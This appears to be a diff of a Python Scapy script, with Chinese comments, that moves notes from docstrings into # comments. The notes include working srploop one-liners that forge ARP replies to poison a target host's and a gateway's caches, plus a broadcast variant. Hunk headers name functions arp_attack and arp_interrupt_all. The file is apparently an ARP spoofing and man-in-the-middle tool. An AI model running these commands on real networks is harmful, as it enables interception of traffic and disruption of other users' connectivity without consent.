@@ -24,28 +24,25 @@ def get_mac_address():
 # arp_request = ARP(psrc="192.168.1.1", pdst="255.255.255.255", op=1)
 # send(arp_request)
 
-"""
-Scapy中网络包的种类：
-sr()：发送三层数据包，等待接收一个或者多个数据包的响应
-sr1()：发送三层数据包，并仅仅等待接收一个数据包的响应
-srp()：发送二层数据包，并且等待响应
-send()：仅仅发送三层数据包，系统会自动处理路由和二层信息
-sendp()：发送二层数据包
-Ether层参数：
-src：发送方mac地址
-dst：接收方物理地址（此处FF:FF:FF:FF:FF:FF为广播）
-ARP层参数：
-op:操作码，1为请求，2为响应
-hwsrc:发送方物理地址
-hwdst:接收方物理地址
-psrc:发送方IP地址
-pdst:接收方IP地址
-srp二层网络包参数：
-iface：指定网卡接口名称（三层网络包或只有一个网卡接口时没有必要指定）
-timeout：超时时间吧。。
-verbose：默认为True，会打印一堆乱七八糟的东西，这里指定为False
-"""
-
+# Scapy中网络包的种类：
+# sr()：发送三层数据包，等待接收一个或者多个数据包的响应
+# sr1()：发送三层数据包，并仅仅等待接收一个数据包的响应
+# srp()：发送二层数据包，并且等待响应
+# send()：仅仅发送三层数据包，系统会自动处理路由和二层信息
+# sendp()：发送二层数据包
+# Ether层参数：
+# src：发送方mac地址
+# dst：接收方物理地址（此处FF:FF:FF:FF:FF:FF为广播）
+# ARP层参数：
+# op:操作码，1为请求，2为响应
+# hwsrc:发送方物理地址
+# hwdst:接收方物理地址
+# psrc:发送方IP地址
+# pdst:接收方IP地址
+# srp二层网络包参数：
+# iface：指定网卡接口名称（三层网络包或只有一个网卡接口时没有必要指定）
+# timeout：超时时间吧。。
+# verbose：默认为True，会打印一堆乱七八糟的东西，这里指定为False
 
 def arp_request(ip_addr, queue=None):
     """
@@ -102,16 +99,19 @@ def arp_scan(queue):
 
 # https://blog.51cto.com/13155409/2129980
 
-"""
-　当前路由器的ip地址是192.168.1.1,MAC地址是24:69:68:49:67:e0 伪装主机
-　本机ip是192.168.1.106，MAC地址是e0:94:67:79:17:2e
-　目标机器ip是192.168.1.101，MAC地址是ac:c1:ee:31:1b:e6 攻击主机
-srploop(Ether(dst="ac:c1:ee:31:1b:e6")/ARP(psrc="192.168.1.1",hwsrc="e0:94:67:79:17:2e",pdst="192.168.1.101",hwdst="ac:c1:ee:31:1b:e6",op=2)) 欺骗101主机本机是网关。 
-srploop(Ether(dst="24:69:68:49:67:e0")/ARP(psrc="192.168.1.101",hwsrc="e0:94:67:79:17:2e",pdst="192.168.1.1",hwdst="24:69:68:49:67:e0",op=2)) 欺骗网关本机是101主机 
-"""
+# 当前路由器的ip地址是192.168.1.1,MAC地址是24:69:68:49:67:e0 伪装主机
+# 本机ip是192.168.1.106，MAC地址是e0:94:67:79:17:2e
+# 目标机器ip是192.168.1.101，MAC地址是ac:c1:ee:31:1b:e6 攻击主机
+# srploop(Ether(dst="ac:c1:ee:31:1b:e6")/
+# ARP(psrc="192.168.1.1",hwsrc="e0:94:67:79:17:2e",
+# pdst="192.168.1.101",hwdst="ac:c1:ee:31:1b:e6",op=2)) 欺骗101主机本机是网关。 
+# srploop(Ether(dst="24:69:68:49:67:e0")/
+# ARP(psrc="192.168.1.101",hwsrc="e0:94:67:79:17:2e",
+# pdst="192.168.1.1",hwdst="24:69:68:49:67:e0",op=2)) 欺骗网关本机是101主机 
 
-
-# srploop(Ether(dst="00:1c:42:85:a3:90")/ARP(psrc="192.168.43.1",hwsrc="f0:18:98:93:dc:22",pdst="192.168.43.113",hwdst="00:1c:42:85:a3:90",op=2))
+# srploop(Ether(dst="00:1c:42:85:a3:90")/
+# ARP(psrc="192.168.43.1",hwsrc="f0:18:98:93:dc:22",
+# pdst="192.168.43.113",hwdst="00:1c:42:85:a3:90",op=2))
 
 def arp_attack(c_ip, c_mac, t_ip, t_mac, p_ip, p_mac, mode):
     """
@@ -142,13 +142,14 @@ def arp_interrupt_all(p_ip, c_mac):
 
 # op2 为回应， 1代表查询
 # 欺骗目标主机 本机为网关
-# srploop(Ether(dst="00:1c:42:85:a3:90")/ARP(psrc="192.168.43.1",hwsrc="f0:18:98:93:dc:22",pdst="192.168.43.113",hwdst="00:1c:42:85:a3:90",op=2))
+# srploop(Ether(dst="00:1c:42:85:a3:90")/
+# ARP(psrc="192.168.43.1",hwsrc="f0:18:98:93:dc:22",
+# pdst="192.168.43.113",hwdst="00:1c:42:85:a3:90",op=2))
 # 欺骗网关 本机为目标主机
 
-"""
-srploop(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc="00:e0:70:52:54:26",psrc="192.168.200.1",op=2)) 
-将数据链路层的目标MAC地址置为全ff，此时该消息的接收者将只关注hwsrc和psrc信息，更新本地arp缓存。
-"""
+# srploop(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc="00:e0:70:52:54:26",psrc="192.168.200.1",op=2))
+# 将数据链路层的目标MAC地址置为全ff，此时该消息的接收者将只关注hwsrc和psrc信息，更新本地arp缓存。
+
 
 # if __name__ == "__main__":
 #     ip = get_host_ip()
